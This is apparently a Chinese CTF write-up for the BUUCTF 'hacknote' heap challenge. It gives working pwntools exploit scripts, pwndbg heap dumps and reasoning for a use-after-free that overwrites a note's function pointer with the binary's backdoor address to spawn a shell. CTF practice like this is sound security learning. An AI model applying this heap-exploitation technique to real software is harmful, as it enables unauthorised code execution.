+++
title = "wp"
date = "2026-04-17"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```python
from pwn import *  
from LibcSearcher import *  
  
context(log_level='debug', arch='i386')  
p = process('./hacknote')  
# p=remote('node5.buuoj.cn',27442)  
  
def dbg():  
    gdb.attach(p)  
    pause()  
  
def add(size, content):  
    p.sendlineafter(b'Your choice :', str(1))  
    p.sendlineafter(b'Note size :', str(size))  
    p.sendafter(b'Content :', content)  
  
def delete(index):  
    p.sendlineafter(b'Your choice :', str(2))  
    p.sendlineafter(b'Index :', str(index))  
  
def print(index):  
    p.sendlineafter(b'Your choice :',str(3))  
    p.sendlineafter(b'Index :',str(index))  
  
  
add(24,b'a')  
add(24,b'a')  
add(72,b'a')  
  
dbg()  
  
p.interactive()
```
来看看结构长什么样
Pasted image 20260417155338.png
```bash
pwndbg> x/32gx 0x8bb5000
0x8bb5000:      0x0000001100000000      0x08bb5018080485fb 
0x8bb5010:      0x0000002100000000      0x0000000000000061
0x8bb5020:      0x0000000000000000      0x0000000000000000
0x8bb5030:      0x0000001100000000      0x08bb5048080485fb
0x8bb5040:      0x0000002100000000      0x0000000000000061
0x8bb5050:      0x0000000000000000      0x0000000000000000
0x8bb5060:      0x0000001100000000      0x08bb5078080485fb
0x8bb5070:      0x0000005100000000      0x0000000000000061
0x8bb5080:      0x0000000000000000      0x0000000000000000
0x8bb5090:      0x0000000000000000      0x0000000000000000
0x8bb50a0:      0x0000000000000000      0x0000000000000000
0x8bb50b0:      0x0000000000000000      0x0000000000000000
0x8bb50c0:      0x00020f4100000000      0x0000000000000000
0x8bb50d0:      0x0000000000000000      0x0000000000000000
0x8bb50e0:      0x0000000000000000      0x0000000000000000
0x8bb50f0:      0x0000000000000000      0x0000000000000000
```
78f540022a9e412d894136b340cbeb4b.png
7430d9f179b24b25a7d45f72f625dae8.png
题目给了一个写好的后门，magic = 0x08048945：
Pasted image 20260417185442.png
理一下思路：
	（1）申请几个堆块，程序是32位的，先申请四个大小为40的chunk，delete（0）（1）
	（2）add（40，payload），申请（0）的同时把（1）的fd改成magic
	（3）add(40,b'a')触发magic

来看申请的堆块长啥样：
```bash
pwndbg> x/32gx 0x92d5000
0x92d5000:      0x0000001100000000      0x092d5018080485fb
0x92d5010:      0x0000003100000000      0x0000000041414141
0x92d5020:      0x0000000000000000      0x0000000000000000
0x92d5030:      0x0000000000000000      0x0000000000000000
0x92d5040:      0x0000001100000000      0x092d5058080485fb
0x92d5050:      0x0000003100000000      0x0000000041414141
0x92d5060:      0x0000000000000000      0x0000000000000000
0x92d5070:      0x0000000000000000      0x0000000000000000
0x92d5080:      0x0000001100000000      0x092d5098080485fb
0x92d5090:      0x0000003100000000      0x0000000041414141
```
11395cfb748f448fb829ac6be3795321.png
这样的重复三个。bk固定是0x080485FB
```python
payload = b'A' * 40 + p32(0x11) + p32(0) + p32(magic) + p32(bk)
```
在只delete(0)(1)的时候是这样的
Pasted image 20260417192235.png
尝试修改fd，把payload发过去
Pasted image 20260417192117.png
很好我们失败了
如果delete的是（1）（2）会变成这样
Pasted image 20260417192516.png
他add是先申请index大的。
申请一个add（8，magic）会给最开始的那个chunk的bk覆盖掉
如果这么做就会得到：
Pasted image 20260417194553.png
说明确实magic写进去了，
```c
  result = *((_DWORD *)&notelist + v2);
  if ( result )
    return (**((int (__cdecl ***)(_DWORD))&notelist + v2))(*((_DWORD *)&notelist + v2));
  return result;
```
而print 的这一段将chunk的第一个4字节当作指令执行，输出第二个4字节写的地址对应的内容。（没看懂，佬说的）
所以只要print（0）就能getshell了
exp：
```python
from pwn import *  
from LibcSearcher import *  
  
context(log_level='debug', arch='i386')  
#p = process('./hacknote')  
p=remote('node5.buuoj.cn',28793)  
  
def dbg():  
    gdb.attach(p)  
    pause()  
  
def add(size, content):  
    p.sendlineafter(b'Your choice :', str(1))  
    p.sendlineafter(b'Note size :', str(size))  
    p.sendafter(b'Content :', content)  
  
def delete(index):  
    p.sendlineafter(b'Your choice :', str(2))  
    p.sendlineafter(b'Index :', str(index))  
  
def print(index):  
    p.sendlineafter(b'Your choice :',str(3))  
    p.sendlineafter(b'Index :',str(index))  
  
magic = 0x08048945  
  
add(40,b'AAAA')  
add(40,b'AAAA')  
add(40,b'AAAA')  
delete(0)  
delete(1)  
add(8,p32(magic))  
print(0)  
  
#dbg()  
p.interactive()
```
